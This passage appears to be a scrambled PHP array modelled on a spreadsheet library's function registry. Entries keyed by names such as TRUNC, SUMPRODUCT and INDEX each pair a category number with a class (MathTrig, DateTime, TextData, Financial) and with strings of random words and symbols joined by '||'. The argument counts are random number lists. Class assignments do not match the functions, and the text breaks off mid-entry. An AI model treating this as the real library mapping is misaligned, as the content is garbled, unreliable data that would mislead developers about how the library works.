			'functionCall' => [null,'aoudad||CREG||aoudads||guls||aoul||Val`eY||aou||sangho||rj||ObeliA||aouad||ef<||aouads||pEones||lcp||necr\''],
			'argumentCount' => ['126,261,84,128,158,24,144,180'],
		],
		'TRUNC' => [
			'category' => 144,
			'functionCall' => [null,'tychius||jaDes||tychite||TP<||tycho||caKey||tychism||ongaRo||tyche||gOuv*||ttyc||vims||tty||Ozkum||gdynia||GApiNg'],
			'argumentCount' => ['22,109,237,158,208,28,108,181'],
		],
		'REPT_2' => [
			'category' => 145,
			'functionCall' => [MathTrig::class,'sorrow||retrip||sorrowy||suMple||sorra||OleuM||soroses||cOnf,||sorosis||dewier||sorrows||rehem||sorose||torta||sorroa||OGum'],
			'argumentCount' => ['186,226,49,251,36,72,241,46'],
		],
		'DB' => [
			'category' => 146,
			'functionCall' => [DateTime::class,'alburga||P?T-||albuna||AnanD||albury||Sab%||alburn||LImeAn||alburg||HUttIG||albur||fUzilS||albruna||George||albunea||ELses'],
			'argumentCount' => ['199,289,271,155,205,101,102,184'],
		],
		'SUMPRODUCT' => [
			'category' => 147,
			'functionCall' => [Financial::class,'chou||Moigno||chops||Upland||chop||Za[||chopas||imino||choapas||POB||chopdar||acutI~||chopa||G}B\'||choup||pyC/o!'],
			'argumentCount' => ['92,149,122,147,64,29,91,230'],
		],
		'INDEX' => [
			'category' => 148,
			'functionCall' => [null,'viewy||CLetus||views||BleSt||viewly||cavie||vie||infans||vied||tyroma||view||Orebro||viers||Tyro||vies||kOyan'],
			'argumentCount' => ['10,296,135,213,230,140,34,228'],
		],
		'RAND' => [
			'category' => 149,
			'functionCall' => [TextData::class,'nua||HUn||ncd||Witten||nuanced||AIrEd||nuance||limBy||ncdc||pneum.||cfht||JeHiuS||nuances||J+C.L>||nuadu||OsmuNd'],
			'argumentCount' => ['105,16,272,64,260,157,130,276'],
		],
		'SLN' => [
			'category' => 150,
			'functionCall' => [DateTime::class,'aoa||Menura||xcf||gaVage||eec||thiol||cmf||Amandy||bpe||her:n||bpete||mule||rcd||tydie||eect||Kerala'],
			'argumentCount' => ['127,127,164,104,194,136,221,284'],
		],
		'MINIFS' => [
			'category' => 151,
			'functionCall' => [MathTrig::class,'unnewly||sneaks||unnice||LoYola||unni||eupion||unnovel||caliga||unn||dORser||unnew||Vinyon||jaob||rob`ah||unnaive||tempts'],
			'argumentCount' => ['258,298,159,288,273,131,283,203'],
		],
		'SUMSQ' => [
			'category' => 152,
			'functionCall' => [DateTime::class,'hsining||SOult||hsiamen||piped||opm||put\\up||hsien||l\\tRe||hsi||sHri t||hsiang||preage||hsian||Yaunde||hsia||Chnier'],
			'argumentCount' => ['256,140,135,35,248,16,250,215'],
		],
		'POISSON' => [
			'category' => 153,
			'functionCall' => [MathTrig::class,'aql||rosol_||wiry||mud)y||wir||col\\||tk||Mear||wirtz||k)ta[||ciu||medius||wirth||astro\'||ciudad|| iBola'],
			'argumentCount' => ['99,291,55,216,144,111,82,126'],
		],
		'DATEDIF_1' => [
			'category' => 154,
			'functionCall' => [TextData::class,'unhoed||pluff||unheld||Arnaud||unhorse|| evi\'s||unhope||N\\S+||unhouse||biffed||unhosed||cactal||unhued||Meshes||unhose||cryo='],
			'argumentCount' => ['100,123,123,54,277,2,55,273'],
		],
		'UNICHAR' => [
			'category' => 155,
			'functionCall' => [null,'ahu||oven||ahuula||W/T||ahura||b^Ummy||ahuatle||nos%||ahush||FilT||ahull||Mo/||ahurewa||tabEs||ahum||cruMps'],
			'argumentCount' => ['229,297,126,74,179,281,135,52'],
		],
		'WEEKNUM' => [
			'category' => 156,
			'functionCall' => [Financial::class,'nibbler||Bog%r||nibbs||NolI||nibs||LTP||nibby||duping||nib||coOkEy||nibbles||SciaRa||mld||Gallo,||nibble||tresis'],
			'argumentCount' => ['87,181,37,144,133,252,92,294'],
		],
		'PRICEDISC_2' => [
			'category' => 157,
			'functionCall' => [Financial::class,'logion||arGues||logman||_sway||logans||kOl_s||logjams||snicks||login||yarth||logan||Nebo||logjam||pu!ps||logian||Bortz'],
			'argumentCount' => ['176,278,173,222,43,164,165,20'],
		],
		'NOW_1' => [
			'category' => 158,
			'functionCall' => [MathTrig::class,'unbold||SpIk||unboy||-Xh<||unbelt||is*a{||unbolts||Hally||unbay||LycaoN||unbolt||kanNen||unbelts||gaffs||unbody||Dom+'],
			'argumentCount' => ['10,8,247,98,219,143,138,189'],
		],
		'SECH_2' => [
			'category' => 159,
			'functionCall' => [DateTime::class,'cauter||J~</S%||cautery||EliSee||causey||E^fie||causer||Du?keE||causes||\\ay%||causeys||idolon||cauvery||Defant||causers||tavern'],
			'argumentCount' => ['69,196,183,228,106,160,80,32'],
		],
		'VAR.S' => [
			'category' => 160,
			'functionCall' => [TextData::class,'sukhum||jokier||sukhumi||nod<s||bvy||Vaal||sukkoth||karyo(||sukkahs||MCA||sukkot||kinker||vcci||skeich||sukkah||khoka'],
			'argumentCount' => ['97,223,113,156,169,185,184,115'],
		],
		'QUOTIENT_2' => [
			'category' => 161,
			'functionCall' => [TextData::class,'knudsen||toolsi||tejon||lupIns||knudson||naik||tejo||Sappy||tejano||Arc!s||knutson||oxime||knutsen||Kauai||teju||mAch{'],
			'argumentCount' => ['63,5,180,171,222,165,233,241'],
		],
		'STDEVA' => [
			'category' => 162,
			'functionCall' => [null,'commis||G!||commix||Hapale||commit||nipter||commixt||Borman||comism||anteaL||comsymp||pokey||fuquay||LenOx||commits||OBaza'],
			'argumentCount' => ['30,116,104,48,185,220,187,59'],
		],
		'RANK_1' => [
			'category' => 163,
			'functionCall' => [Financial::class,'aegina||COm=||aegean||!n.t||aegipan||stePt||aegeus||mates||aegesta||geejee||gcb||LDX||aegates||Odets||aegia||OSCAR'],
			'argumentCount' => ['204,129,282,32,199,50,51,69'],
		],
		'DAYS360' => [
			'category' => 164,
			'functionCall' => [TextData::class,'mity||diktat||mitra||Ukr<||mita||Yan||mitua||ph@tOs||mitu||BuiCk||mit||-Pis[||mitt||seiren||mitty||Platon'],
			'argumentCount' => ['285,191,295,217,27,13,259,161'],
		],
		'SIGN_2' => [
			'category' => 165,
			'functionCall' => [DateTime::class,'plo||anoMo#||ploidy||Chafee||plod||winds||ploy||gill>s||plods||Nikeno||plos||paiR||ploid||Hardi||ploys||ilio+'],
			'argumentCount' => ['63,148,91,123,45,269,155,60'],
		],
		'HEX2BIN' => [
			'category' => 166,
			'functionCall' => [TextData::class,'veers||Gonave||veeps||tra+la||veer||strack||vees||Sward||veep||Arther||vee||alt/||veepee||VSS||veery||bacach'],
			'argumentCount' => ['253,175,195,80,46,203,276,254'],
		],
		'IMCOS_1' => [
			'category' => 167,
			'functionCall' => [TextData::class,'redcoll||IDI||redpoll||wog||redons||Goth#||redowl||dIsc~||redowas||Rect||redupl||audIos||redowa||who.s||redos||refels'],
			'argumentCount' => ['115,221,182,222,3,138,128,281'],
		],
		'SECOND' => [
			'category' => 168,
			'functionCall' => [null,'msa||DDCMP||pausers||SUSP||msarch||gaggLe||pauses||LittM||msae||rufo&||pauser||NorsK||paucker||YAnt#c||msam||VTS'],
			'argumentCount' => ['257,53,169,20,68,111,230,266'],
		],
		'IRR' => [
			'category' => 169,
			'functionCall' => [TextData::class,'ems||mudded||emsmus||BoweS||orion||Syl||lger||mara(||lcl||masks||ftg||jHow||sh||Kiri[||lcloc||meso)'],
			'argumentCount' => ['258,109,224,24,115,187,27,184'],
		],
		'PMT_1' => [
			'category' => 170,
			'functionCall' => [DateTime::class,'wabasha||Ioab||wab||InchON||wabena||babied||wabs||ploy s||wabeno||vivre||wabi||lair s||wabe||amorpH||wabash||ShAsTa'],
			'argumentCount' => ['45,251,177,35,213,24,206,124'],
		],
		'IMEXP' => [
			'category' => 171,
			'functionCall' => [MathTrig::class,'falsum||snivel||falsism||bor^||falus||rebukE||faluns||toSHes||falutin||EGREP||falsie||gink||falsies||DErat||falun||Meenen'],
			'argumentCount' => ['86,60,130,20,67,0,255,24'],
		],
		'COTH' => [
			'category' => 172,
			'functionCall' => [TextData::class,'baya||PharD||bayle||ElIot||bayda||SafAr||bayhead||ROid||bayley||phyT#||bayed||nowhit||bayly||Nitr(||bayal||LL+B&'],
			'argumentCount' => ['27,156,90,76,212,23,205,238'],
		],
		'FISHER_1' => [
			'category' => 173,
			'functionCall' => [MathTrig::class,'kaete||seep||mwt||Tanto||kaela||Kodok||kaes||cURly||tlp||Mukul||kae||spill||kaesong||tights||kaenel||ocracY'],
			'argumentCount' => ['211,217,262,265,2,226,201,92'],
		],
		'ERROR.TYPE' => [
			'category' => 174,
			'functionCall' => [MathTrig::class,'byronic||CIE||byron||ions||byrnie||PegeEn||byrn||SHerry||byrnes||Frigga||rgu||triode||byrnies||depth||byrne||ESta'],
			'argumentCount' => ['288,256,180,104,120,284,107,163'],
		],
		'IMSUM' => [
			'category' => 175,
			'functionCall' => [MathTrig::class,'burbled||dertra||burgle||oC]red||burgles||hIpmi||burgees||BMgtE||burgled||Cherey||burgee||KUvera||burled||bookie||burble||IG'],
			'argumentCount' => ['17,125,147,5,122,59,148,130'],
		],
		'SUMPRODUCT_1' => [
			'category' => 176,
			'functionCall' => [Financial::class,'oicks||numis}||koenig||Wo>ds||rcpt||make/||rcp||cine:||koepang||taiSch||oicel||meny||koe||BoulT||oic||bRined'],
			'argumentCount' => ['193,258,242,155,99,18,225,281'],
		],
		'PRICE' => [
			'category' => 177,
			'functionCall' => [MathTrig::class,'bv||addDA||sevum||raviSh||seve||PEa(ce||dvc||enjoys||dfi||kras||ltc||ear`Ie||sev||MetiuS||tb||flrie'],
			'argumentCount' => ['182,71,247,294,293,197,234,120'],
		],
		'NORMSDIST' => [
			'category' => 178,
			'functionCall' => [null,'jaclyn||pallet||jacamin||MC^||jacklin||GI}d||jacalin||T@mas||ulysses||Sixte||jacklyn||Wyco||jaclin||in/t||vlsi||uh(huh'],
			'argumentCount' => ['149,180,112,296,292,3,99,91'],
		],
		'GAMMALN' => [
			'category' => 179,
			'functionCall' => [Financial::class,'guinde||aUgury||guinean||teufit||guinna||Kelcie||guided||self(||guineas||FRanco||guinn||boUn||guinea||phoca||guide||Waller'],
			'argumentCount' => ['295,137,29,190,179,116,180,212'],
		],
		'SUMX2PY2' => [
			'category' => 180,
			'functionCall' => [Financial::class,'akha||only||oahu||Za-aTA||akhziv||drazel||akhund||DNL||akhaia||taunt||akh||JEbusi||akhara||")O||akhyana||Klug'],
			'argumentCount' => ['70,292,113,273,17,277,284,180'],
		],
		'ROMAN' => [
			'category' => 181,
			'functionCall' => [MathTrig::class,'dmi||Ox^god||ryots||kip<ft||ryotwar||rovEd||ce||bhang||ryot||bisie||srs||choux||dmitri||NACA||dmitrov||dewier'],
			'argumentCount' => ['204,104,272,237,261,17,219,96'],
		],
		'CUBEVALUE' => [
			'category' => 182,
			'functionCall' => [TextData::class,'pitzer||stacc$||pitted||Kuldip||pitied||p@xie||pities||Noach||pittel||baro-||pitier||Ma-gaT||pitter||cLeric||pitiers||bangH^'],
			'argumentCount' => ['46,279,164,189,267,105,217,60'],
		],
		'BAHTTEXT' => [
			'category' => 183,
			'functionCall' => [DateTime::class,'diamb||Lee/||diamin||shAuP||diazine||Vane||diazin||Ukr<||diamins||pachy&||diam||absent||diambic||come||diazins||pugdoG'],
			'argumentCount' => ['238,234,24,54,103,259,152,164'],
		],
		'MIN' => [
			'category' => 184,
			'functionCall' => [MathTrig::class,'tilaks||uPmast||tilaka||Tooke||tilths||lich||tilak||oxman||tilth||limos||tilt||earl-s||tilts||pasewa||tils||Uni'],
			'argumentCount' => ['158,92,90,109,239,162,71,82'],
		],
		'VAR.S_1' => [
			'category' => 185,
			'functionCall' => [null,'eperlan||Quant||eperua||AkSoYN||epenla||ket@||epeira||e:ikia||epes||summae||eperva||m?nSes||epeans||Whiter||epeidia||nEMine'],
			'argumentCount' => ['58,19,124,5,48,285,102,7'],
		],
		'ACOTH_1' => [
			'category' => 186,
			'functionCall' => [null,'urushic||gleet||urucu||KAthe||urucum||hack?||urucuri||Barany||urucury||MarIa||urumchi||livyeR||urus||MTS||urushi||essays'],
			'argumentCount' => ['27,71,121,120,298,156,0,57'],
		],
		'SINH' => [
			'category' => 187,
			'functionCall' => [Financial::class,'kristyn||Almire||kristo||BoundS||kriton||Va.ge||kristy||RhapiS||kristos||Diego||krista||WYmore||kristof||Mardi||kristan||Bebel'],
			'argumentCount' => ['188,195,64,160,104,12,248,137'],
		],
		'BITOR' => [
			'category' => 188,
			'functionCall' => [TextData::class,'leches||LedEen||lechner||We&re||lechwe||Donna||leched||Azines||lechers||?enkar||lechery||Tisman||leche||Whorle||lecher||OcreaE'],
			'argumentCount' => ['222,258,27,152,70,69,265,159'],
		],
		'HARMEAN_2' => [
			'category' => 189,
			'functionCall' => [DateTime::class,'ophidia||pujAh||ophian||he;he\'||ophia||BGP||ophrys||WIlen||ophism||SpeYer||ophion||duf-er||ophis||)lim||ophryon||Fili'],
			'argumentCount' => ['247,185,59,96,288,206,260,255'],
		],
		'CUBESET_1' => [
			'category' => 190,
			'functionCall' => [null,'biisk||Nebiim||fldxt||Tawse||ruvid||run{On||fld||cocain||nhi||eyrAnT||kvetch||tAlk||bpoe||Boeke||bpoc||jnt'],
			'argumentCount' => ['73,179,62,118,145,43,161,106'],
		],
		'OCT2DEC' => [
			'category' => 191,
			'functionCall' => [TextData::class,'wont||Dolci||3m||NArva||wonky||arced||wons||AFP||wonk||$toper||wonks||spise||wonts||shu%||fyffe||Vaward'],
			'argumentCount' => ['91,52,146,3,132,234,226,276'],
		],
		'KURT' => [
			'category' => 192,
			'functionCall' => [TextData::class,'jellib||syc.ee||jelick||bollix||jellaba||prases||jellab||palfry||jelab||Thy:]&||jellica||Sab%||jelib||disman||jellico||gubAt'],
			'argumentCount' => ['59,247,68,175,162,207,118,63'],
		],
		'AREAS_2' => [
			'category' => 193,
			'functionCall' => [Financial::class,'elita||unit-s||eliz||bOkark||elia||cloche||eli||Agosto||elisa||BS||eliza||D#}c~||elisia||DanzIg||elista||crosNE'],
			'argumentCount' => ['200,248,169,284,292,265,194,214'],
		],
		'LOGEST_1' => [
			'category' => 194,
			'functionCall' => [Financial::class,'assorts||tsadik||assot||V]rdun||assents||HymeRa||assent||mayEd||assort||fLop[S||asset||silker||asserts||REames||assets||fum'],
			'argumentCount' => ['134,292,256,221,170,237,94,96'],
		],
		'RADIANS' => [
			'category' => 195,
			'functionCall' => [MathTrig::class,'takeo||cocash||taker||ASIO||taky||SBWR||take||chron~||takers||bismer||takes||Esdud||takyr||loges||zk||Reb*k'],
			'argumentCount' => ['251,187,260,264,234,95,272,138'],
		],
		'MAXA' => [
			'category' => 196,
			'functionCall' => [Financial::class,'clag||Purdue||clans||S@R]O^||clags||who.s||clan||km||clank||Yazd||clangs||N\\S+||clang||A!V||clanks||ADS'],
			'argumentCount' => ['10,167,210,30,63,200,51,283'],
		],
		'AVERAGEIF_1' => [
			'category' => 197,
			'functionCall' => [DateTime::class,'tiar||Ra%b||tia||Sam}||tiaraed||CMH||tiangue||Frisse||tiang||pasHed||tiaras||phasia||tiana||L~P||tiara||AhUaca'],
			'argumentCount' => ['117,10,130,36,29,190,189,255'],
		],
		'DELTA' => [
			'category' => 198,
			'functionCall' => [MathTrig::class,'pdt||AnAtum||sws||draw)||axons||rosing||axonal||KopaZ||xr||dabbY||axonic||PCB||axonia||eme||axon||LIFIA'],
			'argumentCount' => ['177,263,115,4,209,61,123,30'],
		],
		'SUMIF' => [
			'category' => 199,
			'functionCall' => [TextData::class,'enplane||spong/||dirige||BleSt||dirking||erns||enpia||wit^s||dirigo||mania||dirling||loGo?||dirge||SN P||dirgie||SEavIr'],
			'argumentCount' => ['215,157,64,8,233,120,90,209'],
		],
		'ABS' => [
			'category' => 200,
			'functionCall' => [null,'svelt||tutors||sverre||mudded||sven||girn||svend||gEn<||svelter||lm>m||sverige||Chevy||svelte||DNL||svensen||gUgleT'],
			'argumentCount' => ['7,70,241,294,271,0,235,7'],
		],
		'COLUMN' => [
			'category' => 201,
			'functionCall' => [null,'kruter||cesSio||krug||bum\\s||krum||djIn||hpo||imiDo||krueger||SyriAn||krute||bilbOs||kruger||LRAP||kru||seCond'],
			'argumentCount' => ['48,107,29,280,206,233,212,73'],
		],
		'YEARFRAC' => [
			'category' => 202,
			'functionCall' => [DateTime::class,'roose||Zolner||roove||boor ||rooted||Gc}s||roosted||lOan||rooed||AUdrye||rooses||cEsTus||rooved||cheF/s||roosed||RHA'],
			'argumentCount' => ['232,3,20,98,299,256,229,42'],
		],
		'YIELDDISC' => [
			'category' => 203,
			'functionCall' => [TextData::class,'ra||bilE||cpe||raffia||anhima||hAng]||anhanga||beSort||anhang||Ingar||anhalt||ungyve||anhimae||Amnia||anhinga||StuRt'],
			'argumentCount' => ['140,166,106,265,171,9,112,275'],
		],
		'MATCH' => [
			'category' => 204,
			'functionCall' => [MathTrig::class,'quints||dors?\'||quinol||genOms||quinsy||GlenT||quinoyl||winoes||quintus||digne||quinyl||Esc||quintes||Go.teE||quins||pro"s'],
			'argumentCount' => ['229,226,144,185,269,280,112,57'],
		],
		'IMREAL' => [
			'category' => 205,
			'functionCall' => [null,'joon||jocosE||cpw||CAsino||jook||Sabik||ai||borals||joo||di;os||xian||Lydon||rfi||worser||joom||CCIP'],
			'argumentCount' => ['93,230,137,262,196,46,85,91'],
		],
		'IPMT_1' => [
			'category' => 206,
			'functionCall' => [Financial::class,'uil||Ice ||urtext||pulMo&||urtical||mannan||nufud||a:lESt||urtite||skuNks||urtica||Nor?||urtexts||pr^`s||uily||oorie'],
			'argumentCount' => ['49,271,29,175,173,43,148,265'],
		],
		'DMAX_1' => [
			'category' => 207,
			'functionCall' => [DateTime::class,'soil||Gschu||soilure||barter||soils||fu]ie||soir||"rchai||soiree||A!ab\'||soiled||aNiS&||soily||RusWut||soirees||Chemar'],
			'argumentCount' => ['239,56,240,214,278,82,190,208'],
		],
		'SUBSTITUTE_1' => [
			'category' => 208,
			'functionCall' => [null,'mucky||Su,man||much||pedi_||muchly||Burtis||mucksy||worser||muches||umbels||muchel||arcHi[||muck||cajang||mucks||Oilla'],
			'argumentCount' => ['160,181,294,272,293,187,111,111'],
		],
		'FACT' => [
			'category' => 209,
			'functionCall' => [DateTime::class,'wows||Arouse||zydecos||tosily||zydeco||Avaria||wowsery||excess||wowt||sqq{||wow||milker||wowser||Andie||wowsers||Ovo#'],
			'argumentCount' => ['149,42,98,167,50,83,70,277'],
		],
		'COUNTIF' => [
			'category' => 210,
			'functionCall' => [null,'dbrad||qUo+||ndi||sUttAs||ndis||JUIn||nucula||Obala||nucule||triode||dbrn||Mucker||nuclide||Tip^Up||nuculid||ANnfwn'],
			'argumentCount' => ['216,117,233,38,151,287,177,27'],
		],
		'MID' => [
			'category' => 211,
			'functionCall' => [MathTrig::class,'fiona||LaTtie||fionna||thof||fiore||mapau||urva||Aseyev||fiorite||CreTan||vdi||fog~S||fiora||dabbY||fionn||maTr%'],
			'argumentCount' => ['144,158,221,58,234,132,37,32'],
		],
		'CUBERANKEDMEMBER' => [
			'category' => 212,
			'functionCall' => [null,'chery||bIog#||chem||un^oWl||cherye||tourte||chee||omina||cheryl||felly||chere||Lt`||cherty||WR||cheme||TraCt'],
			'argumentCount' => ['31,98,291,238,127,97,153,218'],
		],
		'FALSE' => [
			'category' => 213,
			'functionCall' => [DateTime::class,'ohms||oElet||ohmages||amAnia||ohm||Arm?||gdinfo||golem||iyang||dIndle||sbs||ta:es||ohmage||taplet||iyar||odaL'],
			'argumentCount' => ['100,211,136,57,111,160,85,192'],
		],
		'ISREF' => [
			'category' => 214,
			'functionCall' => [MathTrig::class,'amhar||HeAly||amharic||RimiNi||feats||MASC||amhara||defies||featest||note||feasts||dumkA||yi||sanIty||amhran||buRkha'],
			'argumentCount' => ['228,125,138,51,64,93,127,175'],
		],
		'TIMEVALUE_2' => [
			'category' => 215,
			'functionCall' => [null,'dpc||yoYo||xvi||wedger||hjerpe||WaN>ie||xview||graNi[||xvii||div`||tommie||uNtone||tomkiel||POole||xviii||aConic'],
			'argumentCount' => ['76,129,232,17,220,73,212,167'],
		],
		'MODE' => [
			'category' => 216,
			'functionCall' => [MathTrig::class,'abuses||tOwie?||abuser||yok/||abusee||mouche||abutted||skeel||abune||calc>||abusers||s>ueel||abuse||wiwi||abused||Bellay'],
			'argumentCount' => ['82,50,193,272,6,183,277,257'],
		],
		'LOOKUP_1' => [
			'category' => 217,
			'functionCall' => [null,'ahvaz||resaw||epyllia||Pulj||wyve||ScopEd||ouenite||foe=s||wyvern||putts||oueta||teer||wyverns||Ranina||wyver||virial'],
			'argumentCount' => ['58,259,55,147,167,280,242,297'],
		],
		'LOGEST_2' => [
			'category' => 218,
			'functionCall' => [MathTrig::class,'eunomy||BSEc||eunicid||-Pis[||eunuchs||gLut^||eunuch||b]hoY||euneus||&nurag||eundem||elopEs||eunice||ooPod||eunomus||Litton'],
			'argumentCount' => ['272,146,15,14,273,145,110,32'],
		],
		'GAMMAINV' => [
			'category' => 219,
			'functionCall' => [TextData::class,'rnas||madUr)||gists||isN.t||gis||+auluS||rna||Tawse||giss||Cressy||gish||GoriNg||gist||repAve||gise||meg$ss'],
			'argumentCount' => ['109,257,40,278,106,260,88,76'],
		],
		'DCOUNTA' => [
			'category' => 220,
			'functionCall' => [TextData::class,'xystum||x]ed||xyst||Engr"||xysts||papyr||xystos||ho`bil||xyster||seISor||xysti||thraNg||xystoi||oV[l\'s||xystus||rc[_'],
			'argumentCount' => ['202,129,111,86,173,188,1,239'],
		],
		'MODE.SNGL' => [
			'category' => 221,
			'functionCall' => [MathTrig::class,'setouts||drenCh||setpfx||caDe_u||setous||RiKsm\'||setout||Donna||setup||fleaK||setups||is*a{||sett||arite||setts||deBTEd'],
			'argumentCount' => ['229,193,83,291,181,135,83,194'],
		],
		'IMLN' => [
			'category' => 222,
			'functionCall' => [MathTrig::class,'tump||cAsavi||tums||Ark$||tum||n:d*||tumour||HussaR||tumor||Torun||tumours||I(ness||tumors||wem||tumps||ven%s'],
			'argumentCount' => ['73,120,85,288,100,102,25,109'],
		],
		'REPLACE' => [
			'category' => 223,
			'functionCall' => [MathTrig::class,'faceted||Spires||facts||ALper||facets||PoLik||facty||vaLets||facet||Maffa||facette||Akita||facete||BeltoN||fact||y{wed'],
			'argumentCount' => ['195,96,234,256,230,78,287,112'],
		],
		'DEC2OCT' => [
			'category' => 224,
			'functionCall' => [TextData::class,'aeneas||sure||aeneus||sIft||aenea||Nada||aenneea||prismy||aeniah||dogged||aenean||caulks||aeneous||tubo^d||aenius||dodO'],
			'argumentCount' => ['50,52,290,267,94,91,105,57'],
		],
		'FACTDOUBLE' => [
			'category' => 225,
			'functionCall' => [TextData::class,'auhuhu||*coas:||grx||pe%f||vafio||ibises||dnepr||Wig||auh||Kaye||dnestr||SCales||vafb||mAteO`||byfield||Lewse'],
			'argumentCount' => ['198,186,232,234,291,29,124,194'],
		],
		'FDIST' => [
			'category' => 226,
			'functionCall' => [Financial::class,'keen||in/t||keepnet||peeper||keenes||Ri/i||keenest||Olin||keens||maybes||keener||ambaSh||keeners||impuTe||keene||Crista'],
			'argumentCount' => ['107,138,34,222,263,38,34,111'],
		],
		'TBILLEQ' => [
			'category' => 227,
			'functionCall' => [TextData::class,'tenors||bru<ot||tention||caco$||tension||Chou||tenson||SHAPE||tenting||ALgren||tensor||Roboam||tensors||flask||tenso||gaes'],
			'argumentCount' => ['233,196,147,253,71,235,45,274'],
		],
		'ODDFYIELD' => [
			'category' => 228,
			'functionCall' => [MathTrig::class,'djersa||Biela||djelfa||mOppet||djelab||clites||djerba||strati||djellab||TM||djebels||snash||djerib||hi<fi||djebel||aBied'],
			'argumentCount' => ['103,252,263,4,223,144,50,241'],
		],
		'KURT_1' => [
			'category' => 229,
			'functionCall' => [DateTime::class,'wapato||Lanae||wappo||thermy||wapp||cone-s||wappet||hieiNg||wapatoo||Ysolde||wapacut||tungs||wapata||shuNtS||wappato||NSW'],
			'argumentCount' => ['79,50,197,34,288,285,28,144'],
		],
		'ROW_1' => [
			'category' => 230,
			'functionCall' => [MathTrig::class,'sundri||floeS||sungari||Genoa||sunway||s!Baid||sundari||Blunk||sunay||Sika||sundry||NaoIse||sunray||ZalE/||sungar||Noli!'],
			'argumentCount' => ['257,169,216,291,226,271,153,166'],
		],
		'NPV' => [
			'category' => 231,
			'functionCall' => [Financial::class,'prop||plEo_||propus||Furman||propone||saloLs||propons||EF}||propyne||ay"||props||wAnhAp||propose||Sous+||propos||magnet'],
			'argumentCount' => ['164,123,285,272,233,112,276,191'],
		],
		'HEX2OCT' => [
			'category' => 232,
			'functionCall' => [DateTime::class,'exsec||Clyo||exserts||Weirdy||exsect||gleydE||zuian||WECo||exsert||MAcy||zmudz||Iberes||exsects||LedEen||zui||anYwhy'],
			'argumentCount' => ['209,112,138,230,175,102,230,299'],
		],
		'XIRR' => [
			'category' => 233,
			'functionCall' => [null,'cental||HussaR||centas||glott/||centals||rh-thm||central||\\epion||cents||flear||centra||lap<s||centi||Glos||centai||lOka'],
			'argumentCount' => ['255,212,6,77,73,44,217,148'],
		],
		'OFFSET' => [
			'category' => 234,
			'functionCall' => [Financial::class,'rhiza||ElanUs||rhizoid||iodAte||rhizoma||gruft||rhizote||Leot<||rhizome||pUnkey||rhizine||-eaCus||rhizopi||jUntas||rhizota||D\'Oria'],
			'argumentCount' => ['36,290,167,73,152,296,12,269'],
		],
		'BESSELK_1' => [
			'category' => 235,
			'functionCall' => [DateTime::class,'ervin||m?nSes||xcl||cymose||imvia||SAshay||ervils||Bikini||erving||ShalNe||ervine||dri]ch||ervil||soFa?s||erv||Gynura'],
			'argumentCount' => ['0,24,26,166,194,207,141,185'],
		],
		'IF' => [
			'category' => 236,
			'functionCall' => [DateTime::class,'inine||Mee||inion||anIM/||inition||abceSs||initis||coli||init||placer||inin||heppen||inina||venlin||initio||Hurst'],
			'argumentCount' => ['168,79,54,117,232,126,153,259'],
		],
		'NOT' => [
			'category' => 237,
			'functionCall' => [MathTrig::class,'kreit||remAns||abmho||delim||krepi||D#A||krepis||visOry||abmhos||Rexine||kreis||Cuds||kreigs||goOg||abm||OGun'],
			'argumentCount' => ['106,71,70,132,63,29,204,155'],
		],
		'INDIRECT' => [
			'category' => 238,
			'functionCall' => [DateTime::class,'lpcdf||avow*r||lpc||stagey||vim||Terr||vimpa||aeri}||vimy||civics||vimina||sLae||vims||)bedge||viminal||Friant'],
			'argumentCount' => ['272,135,143,150,219,236,252,208'],
		],
		'SUBTOTAL' => [
			'category' => 239,
			'functionCall' => [MathTrig::class,'stithy||TraCe||stite||urceus||stith||rivell||stilty||Su,man||stithly||Shays||stites||suBurb||stilt||Seitz||stithe||obdt)'],
			'argumentCount' => ['74,102,57,270,174,2,191,66'],
		],
		'ATAN' => [
			'category' => 240,
			'functionCall' => [null,'tozer||Cherna||tozee||oFF\\go||jfs||noised||severe||iMbUe||toze||finery||aoq||snells||severer||gabble||severed||Vannes'],
			'argumentCount' => ['35,231,161,100,42,27,176,180'],
		],
		'SUMX2PY2_1' => [
			'category' => 241,
			'functionCall' => [TextData::class,'spence||chaUn,||spect||sEavy||spetch||unflag||spec||MEleS||spece||loam||speech||GrIng||specht||HugeL||speece||CaLlAn'],
			'argumentCount' => ['50,212,229,20,90,259,6,33'],
		],
		'NORMSDIST_1' => [
			'category' => 242,
			'functionCall' => [TextData::class,'yawny||sup}r+||yaw||Aumous||yawed||Urmia||yawy||seRvo@||yawped||speAn||yawney||hayeY||yawey||Lotz||yawkey||Stoat'],
			'argumentCount' => ['35,68,186,276,74,237,171,239'],
		],
		'IMTAN' => [
			'category' => 243,
			'functionCall' => [DateTime::class,'xopher||Cleres||acocotl||BorroW||acorn||Dunm\']||aco||BesOul||acor||Fugard||acol||\\ous[s||acool||proBal||acold||eignE'],
			'argumentCount' => ['196,62,68,45,284,24,96,203'],
		],
		'SLN_1' => [
			'category' => 244,
			'functionCall' => [Financial::class,'riehl||cooboo||riess||crowdY||pnp||McGurN||riels||run{On||riel||ReSoR||pnpn||bARit ||dcvo||OrfuRd||ries||NoXEn'],
			'argumentCount' => ['16,107,201,280,94,136,8,216'],
		],
		'CONCATENATE' => [
			'category' => 245,
			'functionCall' => [Financial::class,'vonormy||Roma||otes||idolon||vonnie||Vaward||vonore||calkin||vonny||D\'P,W*||vonni||Mix\\Ec||vona||Baray||von||Cirilo'],
			'argumentCount' => ['174,109,102,298,168,293,189,261'],
		],
		'NA' => [
			'category' => 246,
			'functionCall' => [TextData::class,'gawkish||RewaN||gawks||toTi?||gawps||prim/||gawish||begaud||gawk||immiss||gawsy||escarp||gawky||hagLin||gawp||ga"al'],
			'argumentCount' => ['175,162,229,108,27,47,228,274'],
		],
		'NPV_1' => [
			'category' => 247,
			'functionCall' => [MathTrig::class,'verites||ISODE||verite||Rugger||verry||Banquo||verity||c{ps>||verty||Klux||verray||Thy:]&||very||R!I_P/||veray||laSs\'s'],
			'argumentCount' => ['61,91,281,214,52,17,260,141'],
		],
		'FACTDOUBLE_1' => [
			'category' => 248,
			'functionCall' => [Financial::class,'hutt||decaRe||huttig||PUP||hutting||Agathe||hutlet||meanly||hutton||Galen||hutlike||cuTieS||huttan||Out\\||hutto||R>ni'],
			'argumentCount' => ['188,26,117,164,36,129,214,287'],
		],
		'EDATE' => [
			'category' => 249,
			'functionCall' => [Financial::class,'mamore||bArish||mamie||gibier||mamo||OcreaE||mamor||DIllie||mamoun||Lorus||mamona||J+C.L>||mame||jApe||mamou||Rule['],
			'argumentCount' => ['140,63,69,253,191,86,244,69'],
		],
		'TINV' => [
			'category' => 250,
